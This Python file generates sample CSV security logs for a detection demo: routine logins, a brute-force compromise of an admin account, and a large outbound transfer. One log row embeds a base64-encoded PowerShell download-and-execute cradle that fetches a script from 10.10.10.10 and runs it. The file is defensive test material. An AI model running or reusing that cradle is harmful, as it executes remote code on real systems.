import datetime

def generate_sample_logs_csv() -> str:
    """
    Generates a CSV string containing the demo scenario:
    09:00 - Normal login
    09:05 - Normal file access
    09:20 - Failed login x5
    09:22 - Successful login
    09:23 - Privileged command executed
    09:25 - Large data transfer
    """
    today = datetime.datetime.utcnow().strftime('%Y-%m-%d')
    
    logs = [
        "timestamp,source_ip,username,event_type,severity,message",
        f"{today} 09:00:00,192.168.1.50,jdoe,successful_login,INFO,User logged in successfully",
        f"{today} 09:05:00,192.168.1.50,jdoe,file_access,INFO,Accessed report.pdf",
        
        # Brute force from .45 targeting admin
        f"{today} 09:20:00,192.168.1.45,admin,failed_login,WARNING,Invalid password",
        f"{today} 09:20:15,192.168.1.45,admin,failed_login,WARNING,Invalid password",
        f"{today} 09:21:05,192.168.1.45,admin,failed_login,WARNING,Invalid password",
        f"{today} 09:21:30,192.168.1.45,admin,failed_login,WARNING,Invalid password",
        f"{today} 09:21:45,192.168.1.45,admin,failed_login,WARNING,Invalid password",
        
        # Successful login after failures (Compromise)
        f"{today} 09:22:10,192.168.1.45,admin,successful_login,INFO,User logged in successfully",
        
        # Suspicious command execution
        f"{today} 09:23:00,192.168.1.45,admin,command_execution,WARNING,Executed: powershell -ExecutionPolicy Bypass -encodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA==",
        
        # Large data transfer
        f"{today} 09:25:00,192.168.1.45,admin,data_transfer,WARNING,Transferred 5.2GB to unknown external IP",
        
        # Another normal event to show ML contrast
        f"{today} 09:30:00,192.168.1.15,alice,successful_login,INFO,User logged in successfully"
    ]
    
    return "\n".join(logs)

if __name__ == "__main__":
    print(generate_sample_logs_csv())
